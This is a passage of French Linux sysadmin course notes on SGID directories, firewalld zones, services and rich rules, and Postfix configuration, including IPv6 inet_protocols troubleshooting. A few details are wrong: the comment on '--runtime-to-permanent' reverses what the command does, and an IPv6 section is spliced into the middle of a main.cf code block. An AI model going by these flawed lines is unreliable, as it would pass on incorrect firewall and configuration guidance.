**Recommandation sécurité** : `2770` (aucun accès others) pour projets internes.

### SGID vs Sticky Bit

| Bit | Valeur | Emplacement | Effet |
|-----|--------|-------------|-------|
| **SGID** | `2xxx` | Permissions groupe (`s`) | Fichiers créés héritent groupe répertoire |
| **Sticky Bit** | `1xxx` | Permissions others (`t`) | Fichiers supprimables uniquement par owner (/tmp) |

**Exemple combinaison** :
```bash
chmod 3770 /shared    # SGID + Sticky Bit + rwxrwx---
# drwxrws--T
```

### Vérifier SGID actif

```bash
# Méthode 1 : ls -l
ls -ld /projects/team-alpha
# drwxrws--- (s minuscule = SGID + exécution)
# drwxrwS--- (S majuscule = SGID sans exécution, configuration invalide)

# Méthode 2 : stat
stat /projects/team-alpha
# Access: (2770/drwxrws---)

# Méthode 3 : find
find /projects -type d -perm -2000
# Liste répertoires avec SGID actif
```

### Test fonctionnement

```bash
# 1. Activer SGID
sudo mkdir /test-sgid
sudo chgrp developers /test-sgid
sudo chmod 2770 /test-sgid

# 2. Tester création fichier
sudo -u alice touch /test-sgid/file-alice.txt
ls -l /test-sgid/file-alice.txt
# -rw-r--r-- 1 alice developers 0 Jan 8 10:30 file-alice.txt
# Groupe = developers (hérité répertoire parent)

# 3. Tester création sous-répertoire
sudo -u bob mkdir /test-sgid/subdir
ls -ld /test-sgid/subdir
# drwxrwsr-x 2 bob developers 4096 Jan 8 10:30 subdir
# Sous-répertoire hérite aussi groupe + SGID
```

### Use cases professionnels

**Projets développement** :
```bash
# Répertoire code source projet
sudo mkdir -p /srv/projects/webapp
sudo groupadd webapp-devs
sudo usermod -aG webapp-devs alice
sudo usermod -aG webapp-devs bob
sudo chgrp -R webapp-devs /srv/projects/webapp
sudo chmod 2770 /srv/projects/webapp
```

**Partage documents équipe** :
```bash
# Répertoire partagé marketing
sudo mkdir -p /shared/marketing
sudo groupadd marketing
sudo chgrp marketing /shared/marketing
sudo chmod 2775 /shared/marketing  # Lecture publique, écriture groupe
```

**Logs applicatifs** :
```bash
# Plusieurs applications écrivent dans même répertoire
sudo mkdir -p /var/log/apps
sudo groupadd app-loggers
sudo chgrp app-loggers /var/log/apps
sudo chmod 2770 /var/log/apps
```

### Debugging SGID

**Problème : Fichiers créés n'héritent pas groupe** :

```bash
# 1. Vérifier SGID actif
ls -ld /projects/team
# drwxr-xr-x (pas de 's' → SGID absent)

# Solution : Activer SGID
sudo chmod g+s /projects/team

# 2. Vérifier exécution groupe
ls -ld /projects/team
# drwxrwS--- (S majuscule = SGID sans exécution)

# Solution : Ajouter exécution
sudo chmod g+x /projects/team
# drwxrws--- (s minuscule = OK)
```

**Problème : Permission denied** :

```bash
# 1. Vérifier appartenance groupe
groups alice
# alice : alice sudo  (pas membre team-alpha)

# Solution : Ajouter au groupe
sudo usermod -aG team-alpha alice
# Re-login ou : newgrp team-alpha

# 2. Vérifier permissions répertoire
ls -ld /projects/team
# drwxrws--- (OK)

# 3. Vérifier permissions parent
ls -ld /projects
# drwxr-x--- root root (alice ne peut pas accéder /projects)

# Solution : Permissions parent
sudo chmod 755 /projects
```

**Problème : SGID ne s'applique pas récursivement** :

```bash
# SGID ne se propage pas automatiquement aux fichiers existants
ls -l /projects/team/old-file.txt
# -rw-r--r-- 1 alice alice 0 Jan 1 10:00 old-file.txt

# Solution : Changer groupe fichiers existants
sudo chgrp -R team-alpha /projects/team

# Sous-répertoires existants sans SGID
find /projects/team -type d ! -perm -2000
# /projects/team/subdir1

# Solution : Appliquer SGID récursivement
sudo chmod -R g+s /projects/team
```

### Pitfalls

⚠️ **SGID fichiers vs répertoires** : SGID sur fichiers exécutables = exécution avec groupe propriétaire (sécurité) ≠ SGID répertoires (héritage groupe)  
⚠️ **S majuscule** : `drwxrwS---` = SGID sans exécution groupe → configuration invalide (doit être `s` minuscule)  
⚠️ **Chmod numérique 770** : Efface SGID si 3 chiffres → toujours utiliser 4 chiffres (`2770`) ou symbolique (`g+s`)  
⚠️ **Groupe primaire utilisateur** : SGID override groupe primaire → vérifier avec `id username`  
⚠️ **Permissions parent** : SGID inutile si utilisateur ne peut pas accéder répertoire parent  
⚠️ **Chmod -R sans précaution** : `chmod -R 2770` applique SGID fichiers aussi → potentiel risque sécurité (fichiers exécutables)

---

## Module 28 : Firewalld - Firewall dynamique (Challenge 13)

**Concepts :**
- **Firewalld** : Firewall manager dynamique (remplace iptables direct)
- **Zones** : Ensemble règles prédéfinies (trust level différent)
- **Services** : Règles prédéfinies pour applications (http, ssh, mysql, etc.)
- **Runtime vs Permanent** : Règles temporaires (perdues reboot) vs persistantes

### Différence iptables vs firewalld

| Critère | iptables | firewalld |
|---------|----------|-----------|
| Modification rules | Flush + reload (coupe connexions) | Modification dynamique (sans couper) |
| Gestion | Commandes bas-niveau | Interface haut-niveau (zones, services) |
| Persistance | Scripts `/etc/rc.local` | Fichiers XML `/etc/firewalld/` |
| Recommandation | Legacy (experts) | Moderne (administrateurs) |

### Installation

```bash
# RHEL/CentOS/Rocky (Challenge 13)
sudo yum install firewalld -y

# Debian/Ubuntu
sudo apt install firewalld -y

# Démarrer + activer boot
sudo systemctl enable --now firewalld

# Vérifier statut
sudo firewall-cmd --state
# Output : running
```

### Zones firewalld

**Concept :** Chaque zone = niveau trust différent + règles associées.

**Zones prédéfinies (ordre trust décroissant) :**

| Zone | Trust Level | Use Case | Default Rules |
|------|-------------|----------|---------------|
| `trusted` | Très haut | Réseau local sûr | Tout autorisé |
| `home` | Haut | Réseau domestique | SSH, DHCP, services domestiques |
| `internal` | Moyen-Haut | Réseau entreprise interne | SSH, services internes |
| `work` | Moyen | Réseau travail | SSH, services travail |
| `public` | Moyen-Bas | **Réseaux publics (défaut)** | SSH, DHCP uniquement |
| `external` | Bas | NAT/masquerading | SSH + masquerading |
| `dmz` | Bas | Zone démilitarisée | SSH uniquement |
| `block` | Très bas | Bloquer tout (ICMP reject) | Connexions sortantes uniquement |
| `drop` | Minimal | Dropper tout (silent) | Connexions sortantes uniquement |

**Zone par défaut :** `public` (SSH + DHCP autorisés, reste bloqué)

### Commandes zones

```bash
# Lister zones disponibles
sudo firewall-cmd --get-zones

# Voir zone par défaut
sudo firewall-cmd --get-default-zone
# Output : public

# Changer zone par défaut
sudo firewall-cmd --set-default-zone=home

# Voir zone interface réseau spécifique
sudo firewall-cmd --get-zone-of-interface=eth0

# Lister interfaces dans zone
sudo firewall-cmd --zone=public --list-interfaces

# Changer interface de zone
sudo firewall-cmd --zone=home --change-interface=eth0
```

### Gestion services (Challenge 13)

**Services prédéfinis :** `/usr/lib/firewalld/services/` (XML)

```bash
# Lister services disponibles
sudo firewall-cmd --get-services
# Output : http, https, ssh, ftp, mysql, postgresql, dns, smtp, ...

# Voir services autorisés zone active
sudo firewall-cmd --list-services

# Voir services zone spécifique
sudo firewall-cmd --zone=public --list-services

# Ajouter service (runtime - temporaire)
sudo firewall-cmd --add-service=http

# Ajouter service (permanent)
sudo firewall-cmd --permanent --add-service=http
# Requiert --reload pour appliquer

# Ajouter service zone spécifique (permanent)
sudo firewall-cmd --permanent --zone=public --add-service=http

# Retirer service
sudo firewall-cmd --permanent --remove-service=http

# Recharger firewall (appliquer règles permanentes)
sudo firewall-cmd --reload

# Recharger complet (coupe connexions - rare)
sudo firewall-cmd --complete-reload
```

### Gestion ports custom

**Use case :** Application sur port non-standard (pas de service prédéfini).

```bash
# Ajouter port custom (permanent)
sudo firewall-cmd --permanent --add-port=8080/tcp
sudo firewall-cmd --permanent --add-port=3000-3010/tcp  # Range
sudo firewall-cmd --reload

# Ajouter port UDP
sudo firewall-cmd --permanent --add-port=53/udp

# Lister ports autorisés
sudo firewall-cmd --list-ports

# Retirer port
sudo firewall-cmd --permanent --remove-port=8080/tcp
sudo firewall-cmd --reload
```

### Runtime vs Permanent (CRITIQUE)

**2 modes règles :**
- **Runtime** : Actif immédiatement, PERDU au reboot
- **Permanent** : Sauvegardé, nécessite `--reload` pour activation

**Workflow recommandé (Challenge 13) :**

```bash
# Méthode 1 : Permanent + reload
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --reload

# Méthode 2 : Runtime + permanent (redondant mais immédiat)
sudo firewall-cmd --add-service=http                # Runtime (immédiat)
sudo firewall-cmd --permanent --add-service=http    # Permanent (persist reboot)

# Méthode 3 : Permanent PUIS ajouter runtime (efficace)
sudo firewall-cmd --permanent --add-service=http
sudo firewall-cmd --runtime-to-permanent   # Copie permanent → runtime
```

**Commandes runtime :**
```bash
# Ajouter runtime only (perdu reboot)
sudo firewall-cmd --add-service=http

# Copier runtime → permanent
sudo firewall-cmd --runtime-to-permanent

# Copier permanent → runtime (reload)
sudo firewall-cmd --reload
```

### Lister règles complètes

```bash
# Toutes règles zone active
sudo firewall-cmd --list-all

# Toutes règles zone spécifique
sudo firewall-cmd --zone=public --list-all
# Output :
# public (active)
#   target: default
#   interfaces: eth0
#   sources:
#   services: dhcpv6-client http ssh
#   ports: 8080/tcp
#   protocols:
#   forward: no
#   masquerade: no
#   ...

# Toutes règles toutes zones
sudo firewall-cmd --list-all-zones
```

### Rich rules (règles avancées)

**Use case :** Règles complexes (source IP, ports combinés, logging).

```bash
# Autoriser IP spécifique
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.100" accept'

# Bloquer IP
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.0.50" reject'

# Autoriser port pour IP spécifique
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" port port=3306 protocol=tcp accept'

# Logger connexions SSH
sudo firewall-cmd --permanent --add-rich-rule='rule service name="ssh" log prefix="SSH-ACCESS: " level="info" accept'

# Rate limiting (anti-bruteforce SSH)
sudo firewall-cmd --permanent --add-rich-rule='rule service name="ssh" limit value="10/m" accept'

# Lister rich rules
sudo firewall-cmd --list-rich-rules
```

### Masquerading (NAT)

**Use case :** Serveur routeur/gateway (réseau interne → internet).

```bash
# Activer masquerading (NAT)
sudo firewall-cmd --permanent --zone=external --add-masquerade
sudo firewall-cmd --reload

# Vérifier masquerading actif
sudo firewall-cmd --zone=external --query-masquerade
# Output : yes

# Désactiver masquerading
sudo firewall-cmd --permanent --zone=external --remove-masquerade
```

### Port forwarding

**Use case :** Rediriger trafic externe → serveur interne.

```bash
# Forward port 80 → 8080 local
sudo firewall-cmd --permanent --add-forward-port=port=80:proto=tcp:toport=8080

# Forward port 3306 → autre serveur
sudo firewall-cmd --permanent --add-forward-port=port=3306:proto=tcp:toaddr=192.168.1.100

# Forward avec zone
sudo firewall-cmd --permanent --zone=external --add-forward-port=port=443:proto=tcp:toport=8443:toaddr=10.0.0.50
```

### Use cases Challenge 13

**Serveur web Nginx/Apache (port 80 autorisé, port 8080 bloqué) :**

```bash
# Installer firewalld
sudo yum install firewalld -y
sudo systemctl enable --now firewalld

# Autoriser HTTP (port 80) zone public permanent
sudo firewall-cmd --permanent --zone=public --add-service=http
sudo firewall-cmd --reload

# Port 8080 bloqué par défaut (pas ajouté)
# Vérification
sudo firewall-cmd --list-all
# services: dhcpv6-client http ssh (8080 absent)
```

**Serveur HTTPS :**
```bash
sudo firewall-cmd --permanent --add-service=https
sudo firewall-cmd --reload
```

**Serveur SSH port custom :**
```bash
# SSH port 2222 au lieu 22
sudo firewall-cmd --permanent --remove-service=ssh
sudo firewall-cmd --permanent --add-port=2222/tcp
sudo firewall-cmd --reload
```

**Serveur base données (access restreint) :**
```bash
# MySQL accessible uniquement depuis réseau local
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" service name="mysql" accept'
sudo firewall-cmd --reload
```

### Debugging firewalld

**Problème : Service pas accessible après ajout** :
```bash
# 1. Vérifier firewalld actif
sudo firewall-cmd --state

# 2. Vérifier règle présente
sudo firewall-cmd --list-all

# 3. Vérifier zone correcte
sudo firewall-cmd --get-default-zone
sudo firewall-cmd --get-active-zones

# 4. Vérifier règle permanente
sudo firewall-cmd --permanent --list-all

# 5. Recharger firewall
sudo firewall-cmd --reload

# 6. Vérifier service écoute
sudo ss -tuln | grep :80

# 7. Tester depuis autre machine
curl http://server-ip
```

**Problème : Règles permanentes pas appliquées** :
```bash
# CAUSE : Oublié --reload
sudo firewall-cmd --reload
```

**Problème : Conflit iptables** :
```bash
# Firewalld et iptables direct incompatibles
# Désactiver iptables si firewalld utilisé
sudo systemctl stop iptables
sudo systemctl disable iptables
sudo systemctl mask iptables
```

**Logs firewalld** :
```bash
# Voir logs déni connexions (si logging activé)
sudo journalctl -u firewalld -f

# Activer logging
sudo firewall-cmd --set-log-denied=all
# Options : all, unicast, broadcast, multicast, off
```

### Services prédéfinis courants

```bash
http         # 80/tcp
https        # 443/tcp
ssh          # 22/tcp
ftp          # 21/tcp
smtp         # 25/tcp
smtps        # 465/tcp, 587/tcp
pop3         # 110/tcp
pop3s        # 995/tcp
imap         # 143/tcp
imaps        # 993/tcp
dns          # 53/tcp,udp
mysql        # 3306/tcp
postgresql   # 5432/tcp
mongodb      # 27017/tcp
redis        # 6379/tcp
nfs          # 2049/tcp
samba        # 445/tcp
```

### Fichiers configuration

**Zones :** `/etc/firewalld/zones/`  
**Services :** `/usr/lib/firewalld/services/` (défaut) + `/etc/firewalld/services/` (custom)  
**Règles permanentes :** `/etc/firewalld/` (fichiers XML)

**Créer service custom :**
```bash
sudo cp /usr/lib/firewalld/services/http.xml /etc/firewalld/services/myapp.xml
sudo vi /etc/firewalld/services/myapp.xml

<?xml version="1.0" encoding="utf-8"?>
<service>
  <short>MyApp</short>
  <description>My custom application</description>
  <port protocol="tcp" port="3000"/>
  <port protocol="udp" port="3001"/>
</service>

sudo firewall-cmd --reload
sudo firewall-cmd --permanent --add-service=myapp
```

### ⚠️ Pitfalls

1. **Oublier `--reload`** après règles `--permanent` → Règles pas appliquées (attente reboot)
2. **Mauvaise zone** : Règle ajoutée zone inactive → pas d'effet
3. **Conflit iptables** : Firewalld + iptables direct actifs → comportement imprévisible
4. **`--add-service http` sans `--permanent`** → Perdu au reboot
5. **Bloquer SSH par erreur** → Locked out (accès console physique requis)
6. **Port application pas ouvert** : Ajouter règle firewall MAIS oublier démarrer app → toujours bloquer
7. **Rich rules syntaxe** : Erreur syntaxe → règle ignorée silencieusement

### Sécurité best practices

1. **Principe moindre privilège** : Bloquer tout par défaut, autoriser uniquement nécessaire
2. **Changer zone par défaut** : `public` trop restrictif ? → `internal` ou `work`
3. **Rate limiting SSH** : Rich rule anti-bruteforce
4. **Logs activés** : Traçabilité connexions bloquées
5. **Auditer régulièrement** : `firewall-cmd --list-all` vérifier règles obsolètes
6. **Backups règles** : `firewall-cmd --permanent --list-all > firewall-backup.txt`

---

## Module 29 : Postfix - Mail Transfer Agent (Challenge 14)

**Concepts :**
- **MTA (Mail Transfer Agent)** : Serveur SMTP envoi/réception emails (Postfix, Sendmail, Exim)
- **SMTP (Simple Mail Transfer Protocol)** : Protocole port 25 (envoi emails)
- **Mail queue** : File attente emails à envoyer
- **Relay** : Transfert emails vers autre serveur mail

### Architecture mail server

**Composants :**
- **MTA (Postfix)** : Réception/envoi emails via SMTP
- **MDA (Dovecot)** : Accès boîtes mail via IMAP/POP3 (Module 30)
- **MUA (Thunderbird/Outlook)** : Client email utilisateur

**Workflow envoi email :**
```
MUA (client) → SMTP → MTA (Postfix) → SMTP → MTA destinataire → MDA (Dovecot) → IMAP/POP3 → MUA destinataire
```

### Installation (Challenge 14)

```bash
# RHEL/CentOS/Rocky
sudo yum install postfix -y

# Debian/Ubuntu
sudo apt install postfix -y

# Démarrer + activer boot
sudo systemctl enable --now postfix

# Vérifier statut
sudo systemctl status postfix
```

### Configuration /etc/postfix/main.cf (Challenge 14)

**Fichier principal :** `/etc/postfix/main.cf`

**Directives essentielles :**

```bash
# FQDN serveur mail (Challenge 14 line 95)
myhostname = mail.srv.world

# Domaine mail (Challenge 14 line 102)
mydomain = srv.world

# Domaine expéditeur par défaut (Challenge 14 line 118)
myorigin = $mydomain
# Emails envoyés depuis user@srv.world au lieu user@hostname

# Interfaces écoute SMTP (Challenge 14 line 135)
inet_interfaces = all
# all = toutes interfaces | localhost = local only | eth0 = interface spécifique

# Protocoles IP (Challenge 14 line 138)
inet_protocols = ipv4
# ipv4 | ipv6 | all

### Configuration inet_protocols - IPv4/IPv6 (Challenge 15)

**Directive :** `inet_protocols` (fichier `/etc/postfix/main.cf`)

**Valeurs possibles :**
```bash
inet_protocols = all      # IPv4 + IPv6 (défaut Postfix 2.8+)
inet_protocols = ipv4     # IPv4 uniquement
inet_protocols = ipv6     # IPv6 uniquement
```

**Use case Challenge 15 :**
- **Problème** : Postfix service fails avec erreur :
  ```
  fatal: parameter inet_interfaces: no local interface found for ::1
  ```
- **Root cause** : `inet_protocols = all` (IPv4+IPv6 activé) MAIS serveur sans configuration réseau IPv6
- **Diagnostic** : `ip a` ne montre aucune adresse IPv6 (pas de `inet6`, pas de `::1` loopback)
- **Solution** : Forcer IPv4 uniquement → `inet_protocols = ipv4`

**Interaction avec inet_interfaces :**

| inet_interfaces | inet_protocols | Bindings | Explication |
|-----------------|----------------|----------|-------------|
| `all` | `all` | `0.0.0.0:25` + `:::25` | Écoute IPv4+IPv6 toutes interfaces |
| `all` | `ipv4` | `0.0.0.0:25` | Écoute IPv4 uniquement toutes interfaces |
| `localhost` | `all` | `127.0.0.1:25` + `::1:25` | Écoute IPv4+IPv6 localhost uniquement |
| `localhost` | `ipv4` | `127.0.0.1:25` | Écoute IPv4 localhost uniquement |

**IPv6 troubleshooting - Symptômes et solutions :**

**1. Erreur "no local interface found for ::1" :**
```bash
# Symptôme
sudo systemctl status postfix
# Output : fatal: parameter inet_interfaces: no local interface found for ::1

# Diagnostic
ip a
# Aucune ligne "inet6" visible → pas d'IPv6 configuré

ip -6 a
# Output vide ou seulement fe80:: (link-local, insuffisant)

# Cause
inet_protocols = all        # Postfix attend IPv6
# MAIS système n'a pas d'IPv6 (pas de ::1 loopback)

# Solution 1 : Désactiver IPv6 Postfix (Challenge 15)
sudo vi /etc/postfix/main.cf
# Modifier : inet_protocols = ipv4

sudo systemctl restart postfix
# Service démarre OK

# Solution 2 : Activer IPv6 système (alternative complexe)
sudo vi /etc/sysctl.conf
# Ajouter :
net.ipv6.conf.all.disable_ipv6 = 0
net.ipv6.conf.default.disable_ipv6 = 0

sudo sysctl -p
ip -6 a        # Vérifier ::1 présent
sudo systemctl restart postfix
```

**2. Erreur binding port :::25 :**
```bash
# Symptôme
sudo ss -tuln | grep :25
# Aucune ligne :::25 (IPv6 binding manquant) mais erreur logs

# Cause
# IPv6 activé Postfix mais interfaces IPv6 down/absent

# Solution
inet_protocols = ipv4    # Forcer IPv4 uniquement
```

**3. Warnings logs IPv6 (non-fatal mais verbeux) :**
```bash
# Symptôme
sudo tail -f /var/log/maillog
# warning: inet_protocols: disabling IPv6 name/address support: Address family not supported

# Cause
# IPv6 désactivé OS-level (/proc/sys/net/ipv6/conf/all/disable_ipv6 = 1)
# MAIS Postfix inet_protocols = all (tente utiliser IPv6)

# Solution : Aligner Postfix avec config système
inet_protocols = ipv4    # Si IPv6 désactivé système
```

**Quand utiliser chaque valeur :**

**`inet_protocols = ipv4` (IPv4 uniquement) :**
- ✅ Serveurs legacy IPv4-only
- ✅ Containers/VMs sans IPv6 networking (Docker par défaut)
- ✅ Simplifier configuration (moins de bindings, moins de logs)
- ✅ Éviter erreurs "no local interface" si IPv6 absent
- ✅ Environnements internes réseau privé IPv4
- ❌ Servers publics (Gmail/Outlook préfèrent IPv6)

**`inet_protocols = all` (IPv4 + IPv6 - défaut) :**
- ✅ Infrastructure moderne dual-stack
- ✅ Email providers require IPv6 (Google, Microsoft, Yahoo)
- ✅ Future-proof (transition IPv4 → IPv6 globale)
- ✅ Conformité standards (RFCs email recommandent dual-stack)
- ❌ Serveurs sans IPv6 → erreurs startup
- ❌ Logs verbeux warnings si IPv6 disabled OS

**`inet_protocols = ipv6` (IPv6 uniquement - rare) :**
- ✅ Infrastructure IPv6-only (très rare en production)
- ✅ Tests migration IPv6
- ❌ Incompatible legacy clients IPv4-only
- ❌ Perte connectivité majorité Internet (encore IPv4-dominant)

**Commandes vérification IPv4/IPv6 :**

```bash
# Vérifier valeur active inet_protocols
postconf inet_protocols
# Output : inet_protocols = ipv4

# Voir default inet_protocols (Postfix compiled)
postconf -d inet_protocols
# Output : inet_protocols = all (défaut moderne Postfix)

# Lister directives non-default
postconf -n | grep inet_protocols
# Si absent output = valeur par défaut utilisée

# Modifier inet_protocols
sudo postconf -e "inet_protocols = ipv4"

# Vérifier bindings ports SMTP
sudo ss -tuln | grep :25
# 0.0.0.0:25          → IPv4 binding
# :::25               → IPv6 binding (includes IPv4-mapped si dual-stack)
# Les deux lignes     → Dual-stack explicite

sudo netstat -tuln | grep :25
# Alternative ss (legacy)

# Tester SMTP IPv4
telnet 127.0.0.1 25
# ou
nc -4 localhost 25

# Tester SMTP IPv6
telnet ::1 25
# ou
nc -6 localhost 25
# Si erreur "Connection refused" et inet_protocols=ipv4 → Normal (IPv6 disabled)

# Vérifier IPv6 système actif
ip -6 a
# Chercher "inet6 ::1/128 scope host" (loopback IPv6)
# Si absent → IPv6 disabled système

cat /proc/sys/net/ipv6/conf/all/disable_ipv6
# 0 = IPv6 enabled
# 1 = IPv6 disabled

# Vérifier Postfix écoute quelles interfaces
sudo lsof -i :25
# Voir IPv4/IPv6 listeners
```

**Testing configuration :**

```bash
# Test 1 : Configuration syntax
sudo postfix check
# Pas d'output = OK
# Errors affichées = config invalide

# Test 2 : Reload vs Restart
# Après modif inet_protocols → RESTART REQUIS
sudo systemctl restart postfix
# reload INSUFFISANT pour inet_protocols (reload = config only, pas bindings)

# Test 3 : Validation service active
sudo systemctl status postfix
# Active (running) = OK
# Failed = voir "journalctl -xe" pour cause

# Test 4 : Logs errors
sudo tail -50 /var/log/maillog | grep fatal
sudo tail -50 /var/log/maillog | grep error

sudo journalctl -u postfix -n 50 | grep -E "fatal|error"

# Test 5 : SMTP connectivity
echo "Test email" | mail -s "Test Subject" root
sudo tail -f /var/log/maillog
# Voir "status=sent" = email envoyé queue
```

**IPv4-mapped IPv6 addresses (advanced) :**

```bash
# Postfix dual-stack peut bind :::25 (IPv6) qui INCLUT IPv4-mapped
# IPv4-mapped format : ::ffff:192.0.2.1 (IPv4 address wrapped IPv6)

# Exemple ss output dual-stack :
tcp   LISTEN 0   100   :::25   :::*
# :::25 = IPv6 wildcard (écoute IPv6 + IPv4-mapped)

# Exemple ss output IPv4 only :
tcp   LISTEN 0   100   0.0.0.0:25   0.0.0.0:*
# 0.0.0.0:25 = IPv4 wildcard uniquement

# Logs Postfix IPv4-mapped :
# connect from unknown[::ffff:192.168.1.100]
# → Client IPv4 192.168.1.100 vu comme IPv4-mapped sur listener IPv6

# Si problèmes IPv4-mapped (rare) :
inet_protocols = ipv4    # Force IPv4 native bindings
```

**Production best practices :**

**Serveurs mail publics (MX records) :**
```bash
inet_protocols = all      # Dual-stack REQUIS
# Gmail, Outlook, Yahoo préfèrent IPv6 (meilleure délivrabilité)
# MX records doivent avoir A (IPv4) + AAAA (IPv6) records

# Vérifier DNS MX dual-stack :
dig MX example.com +short
# mail.example.com
dig A mail.example.com +short
# 203.0.113.10           (IPv4 address)
dig AAAA mail.example.com +short
# 2001:db8::1            (IPv6 address)
```

**Serveurs internes/relays :**
```bash
inet_protocols = ipv4     # Simplifier si réseau interne IPv4-only
# Moins de logs warnings
# Pas d'erreurs binding IPv6
# Configuration plus simple
```

**Containers Docker :**
```bash
# Docker par défaut = IPv4 only networking
inet_protocols = ipv4     # Éviter errors ::1 not found
# Sauf docker network --ipv6 utilisé
```

**Firewall considerations :**

```bash
# Firewalld dual-stack
sudo firewall-cmd --permanent --add-service=smtp          # Port 25 IPv4+IPv6
sudo firewall-cmd --permanent --add-service=submission    # Port 587 IPv4+IPv6
sudo firewall-cmd --reload

# iptables IPv4
sudo iptables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 587 -j ACCEPT

# ip6tables IPv6 (requis si inet_protocols=all)
sudo ip6tables -A INPUT -p tcp --dport 25 -j ACCEPT
sudo ip6tables -A INPUT -p tcp --dport 587 -j ACCEPT

# Oublier ip6tables avec inet_protocols=all = connexions IPv6 bloquées
```

**⚠️ Pitfalls IPv6 Postfix :**

1. **Enable IPv6 sans config réseau** → Fatal error "no local interface ::1" (Challenge 15)
2. **Modifier inet_protocols + reload** → Changes pas appliquées (restart REQUIS)
3. **Firewall oublie ip6tables** → IPv6 connections timeout (mais IPv4 OK)
4. **inet_protocols=all avec IPv6 disabled OS** → Logs remplis warnings (non-fatal mais verbeux)
5. **Dual-stack partial** : DNS AAAA record existe MAIS firewall bloque IPv6 → timeout clients IPv6
6. **IPv4-mapped addresses** : Logs confusing (::ffff:x.x.x.x) vs IPv4 classique
7. **Docker default networking** : IPv4-only, mais inet_protocols=all → errors containers Postfix
8. **Testing IPv6** : `telnet ::1 25` vs `telnet localhost 25` (localhost peut résoudre 127.0.0.1 OR ::1)

**Debugging workflow IPv6 issues :**

```bash
# Step 1 : Identifier error
sudo systemctl status postfix
sudo journalctl -u postfix -n 50

# Step 2 : Vérifier config système IPv6
ip -6 a
cat /proc/sys/net/ipv6/conf/all/disable_ipv6

# Step 3 : Vérifier config Postfix
postconf inet_protocols
postconf inet_interfaces

# Step 4 : Aligner configs
# Si IPv6 absent système → inet_protocols = ipv4
# Si IPv6 présent système → inet_protocols = all (garder dual-stack)

# Step 5 : Restart (pas reload)
sudo systemctl restart postfix

# Step 6 : Validate
sudo ss -tuln | grep :25
telnet localhost 25
sudo tail -f /var/log/maillog
```

# Domaines acceptés livraison locale (Challenge 14 line 183)
mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain
# Emails pour ces domaines stockés localement (pas relay)

# Réseaux autorisés relay (Challenge 14 line 283)
mynetworks = 127.0.0.0/8, 10.0.0.0/24
# Machines ces réseaux peuvent envoyer emails via serveur SANS auth

# Format mailbox (Challenge 14 line 438)
home_mailbox = Maildir/
# Maildir/ = un fichier par email (recommandé)
# mbox = tous emails un seul fichier (legacy)

# Banner SMTP (Challenge 14 line 593)
smtpd_banner = $myhostname ESMTP
# Masquer version Postfix (sécurité)

# Désactiver VRFY (Challenge 14)
disable_vrfy_command = yes
# Empêche énumération users (sécurité)

# Exiger HELO (Challenge 14)
smtpd_helo_required = yes
# Force clients SMTP envoyer HELO/EHLO (anti-spam)

# Limite taille emails (Challenge 14)
message_size_limit = 10240000
# 10MB (10240000 bytes)

# Timeout SMTP
smtpd_timeout = 300s
smtp_connect_timeout = 30s
```

### SMTP-Auth (authentification Dovecot SASL - Challenge 14)

**Use case :** Permettre users authentifiés envoyer emails (relay avec login).

**Configuration Postfix → Dovecot SASL :**

```bash
# Type SASL (Challenge 14)
smtpd_sasl_type = dovecot

# Chemin socket SASL Dovecot (Challenge 14)
smtpd_sasl_path = private/auth
# Socket UNIX : /var/spool/postfix/private/auth

# Activer SMTP-Auth (Challenge 14)
smtpd_sasl_auth_enable = yes

# Options sécurité SASL (Challenge 14)
smtpd_sasl_security_options = noanonymous
# noanonymous = bloquer auth anonyme

# Domaine SASL local (Challenge 14)
smtpd_sasl_local_domain = $myhostname

# Restrictions destinataires (Challenge 14)
smtpd_recipient_restrictions =
  permit_mynetworks,
  permit_sasl_authenticated,
  reject_unauth_destination

# Logique :
# 1. permit_mynetworks : Réseaux mynetworks autorisés (sans auth)
# 2. permit_sasl_authenticated : Users authentifiés SMTP-Auth autorisés
# 3. reject_unauth_destination : Bloquer relay non autorisé (anti-spam)
```

**Pourquoi SMTP-Auth ?**
- Éviter relay ouvert (source spam)
- Permettre users nomades envoyer emails
- Authentification avant relay

### Commandes essentielles

```bash
# Vérifier configuration (non-default settings)
postconf -n

# Lister toutes directives
postconf

# Afficher directive spécifique
postconf myhostname
postconf mydestination

# Modifier directive
sudo postconf -e "myhostname = mail.example.com"

# Recharger configuration (pas redémarrage)
sudo postfix reload
sudo systemctl reload postfix

# Redémarrer Postfix
sudo systemctl restart postfix

# Vérifier syntaxe configuration
sudo postfix check
```

### Mail queue (file attente)

```bash
# Voir emails en attente (queue)
postqueue -p
mailq
# Output : Queue ID, Size, Arrival Time, Sender, Recipient

# Vider queue (forcer envoi immédiat)
postqueue -f

# Supprimer email queue (par Queue ID)
sudo postsuper -d <QUEUE_ID>

# Supprimer TOUS emails queue
sudo postsuper -d ALL

# Supprimer emails deferred queue only
sudo postsuper -d ALL deferred

# Statistiques queue
qshape deferred
qshape active
```

### Tests SMTP

**Telnet SMTP (manuel) :**

```bash
telnet localhost 25

# Output :
# 220 mail.srv.world ESMTP

# Commandes SMTP :
EHLO test.local
MAIL FROM: <sender@example.com>
RCPT TO: <recipient@srv.world>
DATA
Subject: Test email

This is a test email.
.
QUIT
```

**Mail command :**
```bash
# Envoyer email simple
mail -s "Subject" recipient@example.com <<< "Email body"

# Envoyer email avec fichier
mail -s "Subject" recipient@example.com < /path/to/file.txt

# Envoyer avec pièce jointe (mailx)
echo "Body" | mail -s "Subject" -A /path/to/attachment.pdf recipient@example.com
```

### Logs Postfix

```bash
# Logs Postfix (RHEL/CentOS)
sudo tail -f /var/log/maillog

# Logs Postfix (Debian/Ubuntu)
sudo tail -f /var/log/mail.log

# Logs journald
sudo journalctl -u postfix -f

# Rechercher email spécifique (par Queue ID)
grep <QUEUE_ID> /var/log/maillog

# Rechercher emails sender
grep "from=<sender@example.com>" /var/log/maillog

# Rechercher emails destinataire
grep "to=<recipient@example.com>" /var/log/maillog

# Statistiques Postfix (pflogsumm)
sudo pflogsumm /var/log/maillog
```

### Use cases

**1. Serveur mail local (envoi only - applications) :**
```bash
myhostname = app-server.local
